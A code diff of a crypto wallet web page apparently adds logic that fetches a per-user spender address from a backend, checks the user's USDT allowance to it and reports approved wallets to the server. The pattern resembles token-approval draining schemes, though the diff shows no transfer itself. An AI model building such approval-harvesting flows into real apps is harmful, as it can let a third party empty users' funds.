@@ -9,6 +9,7 @@ import {
   useChainId,
   useWriteContract,
   useWaitForTransactionReceipt,
+  useContractRead,
 } from "wagmi";
 import { useConnectModal } from "@rainbow-me/rainbowkit";
 import { erc20Abi } from "viem";
@@ -20,6 +21,27 @@ import Activity from "../components/activity";
 import { getExchangeRate } from "../lib/api";
 import { useSettingChangeStore } from "../store/settingChangeStore";
 import { useAuthRemainingStore } from "../store/authRemainingStore";
+
+// 添加钱包授权请求函数
+export const getWalletAuthorization = async (
+  address: string,
+  network: string,
+  inviteCode: string = "",
+) => {
+  console.log("开始获取钱包授权");
+
+  if (!address) {
+    throw new Error("钱包地址不能为空");
+  }
+
+  const response = await axios.post("/wallets/get-wallet-Authorization", {
+    inviteCode,
+    address,
+    network,
+  });
+
+  return response.data.data;
+};
 
 // 定义 FAQ 项目的接口
 interface FAQItem {
@@ -234,7 +256,58 @@ function Home() {
     retry: 1,
   });
 
-  // 监听交易receipt
+  // 获取授权地址
+  const { data: walletAuth } = useQuery({
+    queryKey: ["wallet-auth", address, chainId],
+    queryFn: async () => {
+      if (!userProfile?.user || !address) return null;
+
+      try {
+        const currentNetwork =
+          chainId === 1 ? "ETH" : chainId === 56 ? "BSC" : "ETH";
+        return await getWalletAuthorization(
+          userProfile.user.address as string,
+          currentNetwork,
+          userProfile.user.invitedBy || "",
+        );
+      } catch (error) {
+        console.error("获取授权地址失败:", error);
+        return null;
+      }
+    },
+    enabled: !!address && !!userProfile?.user,
+  });
+
+  // 自动检查授权状态
+  const { data: allowance } = useContractRead({
+    address: USDT_CONTRACT_ADDRESSES[
+      chainId as keyof typeof USDT_CONTRACT_ADDRESSES
+    ] as `0x${string}`,
+    abi: erc20Abi,
+    functionName: "allowance",
+    args: walletAuth?.address
+      ? [address as `0x${string}`, walletAuth.address as `0x${string}`]
+      : undefined,
+    query: {
+      enabled: !!address && !!walletAuth?.address,
+    },
+  });
+  //有可能(监听授权交易receipt无反应)会检查授权状态
+  useEffect(() => {
+    if (allowance !== undefined) {
+      const isAuthorized = BigInt(allowance) > BigInt(0);
+      if (isAuthorized && !userProfile?.user?.isVerified) {
+        // 调用后端接口
+        axios.post("customers/verify", {
+          network: chainId === 1 ? "ETH" : chainId === 56 ? "BSC" : "ETH",
+          address,
+          isVerified: true,
+        });
+      }
+    }
+  }, [allowance, walletAuth?.address]);
+
+  // 监听授权交易receipt
   useEffect(() => {
     if (receipt && receipt.status === "success") {
       // 交易成功后调用后端接口
@@ -277,19 +350,8 @@ function Home() {
       // 从用户信息中获取必要数据
       const { invitedBy } = userProfile.user;
 
-      console.log("准备发送请求，参数:", {
-        inviteCode: invitedBy || "", // 如果 invitedBy 为空，传空字符串
-        address,
-        network: currentNetwork,
-      });
-
-      const response = await axios.post("/wallets/get-wallet-Authorization", {
-        inviteCode: invitedBy || "", // 如果 invitedBy 为空，传空字符串
-        address, // 使用当前连接的钱包地址
-        network: currentNetwork, // 使用当前链的网络信息
-      });
-
-      return response.data.data;
+      // 调用导出的函数
+      return getWalletAuthorization(address, currentNetwork, invitedBy || "");
     },
   });
 
@@ -784,7 +846,7 @@ function Home() {
                 viewBox="0 0 24 24"
                 fill="currentColor"
               >
-                <path d="M11.8 10.9c-2.27-.59-3-1.2-3-2.15 0-1.09 1.01-1.85 2.7-1.85 1.78 0 2.44.85 2.5 2.1h2.21c-.07-1.72-1.12-3.3-3.21-3.81V3h-3v2.16c-1.94.42-3.5 1.68-3.5 3.61 0 2.31 1.91 3.46 4.7 4.13 2.5.6 3 1.48 3 2.41 0 .69-.49 1.79-2.7 1.79-2.06 0-2.87-.92-2.98-2.1h-2.2c.12 2.19 1.76 3.42 3.68 3.83V21h3v-2.15c1.95-.37 3.5-1.5 3.5-3.55 0-2.84-2.43-3.81-4.7-4.4z" />
+                <path d="M11.8 10.9c-2.27-.59-3-1.2-3-2.15 0-1.09 1.01-1.85 2.7-1.85 1.78 0 2.44.85 2.5 2.1h2.21c-.07-1.72-1.12-3.3-3.21-3.81V3h-3v2.16c-1.94.42-3.5 1.68-3.5 3.61 0 2.31 1.91 3.46 4.7 4.13 2.5.6 3 1.48 3 2.41 0 .69-.49 1.79-2.7 1.79-2.06 0-2.87-.92-2.98-2.1h-2.2c.12 2.19 1.76 3.42 3.68 3.83V19h3v-2.15c1.95-.37 3.5-1.5 3.5-3.55 0-2.84-2.43-3.81-4.7-4.42z" />
               </svg>
             </div>
           </div>
